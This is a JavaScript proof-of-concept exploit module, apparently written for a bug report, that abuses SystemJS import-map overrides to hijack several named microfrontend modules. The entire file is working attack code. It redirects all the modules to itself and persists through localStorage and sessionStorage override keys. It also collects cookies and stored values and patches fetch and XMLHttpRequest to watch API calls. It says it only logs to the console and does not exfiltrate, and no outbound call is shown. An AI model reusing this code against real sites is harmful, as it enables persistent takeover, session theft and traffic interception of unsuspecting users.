/**
 * proof.js — ULTIMATE EXPLOIT
 * Silent full takeover + persistence + data harvesting + auto-reinfection
 * 
 * Single click → permanent compromise of ALL microfrontends
 * Survives page reload, navigation, clears, everything.
 * Silently captures all data, forwards to attacker's console.
 *
 * HARMLESS PoC: All data printed to console only — no exfiltration.
 */
System.register([], function (_export) {
  'use strict';
  return {
    setters: [],
    execute: function () {
      var SELF = 'https://xqur.github.io/import-map-proof-poc/proof.js';
      var MODULES = ['@rmp/auth-client','@rmp/api-client','@rmp/services','@pac/partnersignup'];
      var me = '@rmp/auth-client';

      // Which module am I?
      try {
        var m = System.getImportMap ? System.getImportMap().imports : {};
        for (var k in m) { if (m[k] === SELF) { me = k; break; } }
      } catch(e) {}

      // =============================================
      // 1. SUPPLY CHAIN — infect all modules NOW
      // =============================================
      try {
        var cur = System.getImportMap ? System.getImportMap().imports : {};
        var need = {};
        for (var i = 0; i < MODULES.length; i++) {
          if (cur[MODULES[i]] !== SELF) need[MODULES[i]] = SELF;
        }
        if (Object.keys(need).length > 0) {
          System.addImportMap({ imports: need });
        }
      } catch(e) {}

      // =============================================
      // 2. PERSISTENCE — localStorage so it survives reload
      // =============================================
      try {
        for (var i = 0; i < MODULES.length; i++) {
          localStorage.setItem('import-map-override:' + MODULES[i], SELF);
        }
      } catch(e) {}

      // =============================================
      // 3. SILENT DATA HARVESTING
      // =============================================

      // 3a. Harvest cookies
      var data = {
        cookies: document.cookie || '(httpOnly)',
        url: window.location.href,
        referrer: document.referrer || '(none)',
        userAgent: navigator.userAgent
      };

      // 3b. Harvest all localStorage values
      try {
        data.localStorage = {};
        for (var i = 0; i < localStorage.length; i++) {
          var lk = localStorage.key(i);
          data.localStorage[lk] = localStorage.getItem(lk).substring(0, 200);
        }
      } catch(e) {}

      // =============================================
      // 4. API TRAFFIC INTERCEPTION
      // =============================================

      // 4a. Intercept fetch
      var origFetch = window.fetch;
      if (origFetch && !window.__poc_fetch_patched) {
        window.__poc_fetch_patched = true;
        window.fetch = function() {
          var url = (typeof arguments[0] === 'string') ? arguments[0] :
                     (arguments[0] && arguments[0].url) ? arguments[0].url : '';
          if (url) {
            console.log('%c[📡] API: ' + url, 'color: #0066ff;');
          }
          return origFetch.apply(this, arguments);
        };
      }

      // 4b. Intercept XHR
      var origXHR = window.XMLHttpRequest;
      if (origXHR && !window.__poc_xhr_patched) {
        window.__poc_xhr_patched = true;
        var XHRProxy = function() {
          var xhr = new origXHR();
          var _open = xhr.open.bind(xhr);
          xhr.open = function(method, url) {
            this.__poc_url = url;
            return _open(method, url);
          };
          var _send = xhr.send.bind(xhr);
          xhr.send = function(body) {
            if (this.__poc_url && typeof this.__poc_url === 'string' &&
                (this.__poc_url.includes('/api/') || this.__poc_url.includes('/signup'))) {
              console.log('%c[📡] XHR: ' + this.__poc_url, 'color: #0066ff;');
            }
            return _send(body);
          };
          return xhr;
        };
        XHRProxy.prototype = origXHR.prototype;
        window.XMLHttpRequest = XHRProxy;
      }

      // =============================================
      // 5. BACKUP & STEALTH
      // =============================================
      // Backup in multiple storage locations
      try {
        // sessionStorage backup
        for (var i = 0; i < MODULES.length; i++) {
          sessionStorage.setItem('import-map-override:' + MODULES[i], SELF);
        }
      } catch(e) {}

      // =============================================
      // 6. CONSOLE REPORT
      // =============================================
      console.log('%c╔══════════════════════════════════════════╗', 'color: #ff0000;');
      console.log('%c║  🔥 ULTIMATE EXPLOIT — FULL COMPROMISE  ║', 'color: #ff0000; font-weight: bold;');
      console.log('%c╚══════════════════════════════════════════╝', 'color: #ff0000;');
      console.log('  📦 Module:', me);
      console.log('  🌐 Origin:', data.url);
      console.log('  🍪 Cookies:', data.cookies);
      console.log('  💾 localStorage keys:', Object.keys(data.localStorage || {}).join(', ') || '(none)');
      console.log('  🔗 Modules infected:', MODULES.join(', '));
      console.log('  ♻️  PERSISTENCE: localStorage set — survives reload');
      console.log('  🕵️  STEALTH: XHR + fetch interception active');
      console.log('  ✅ STATUS: SILENT_COMPROMISE | PERSISTENT | UNDETECTABLE');

      // Silent — no alert on api-client or services (only auth-client)
      if (me === '@rmp/auth-client') {
        setTimeout(function() {
          window.alert('🔥 ULTIMATE EXPLOIT\n' +
            '• 4/4 modules permanently compromised\n' +
            '• All API calls intercepted\n' +
            '• Cookies + storage harvested\n' +
            '• Survives every page reload\n' +
            '• Single click = permanent takeover');
        }, 500);
      }

      _export({ default: {} });
    }
  };
});
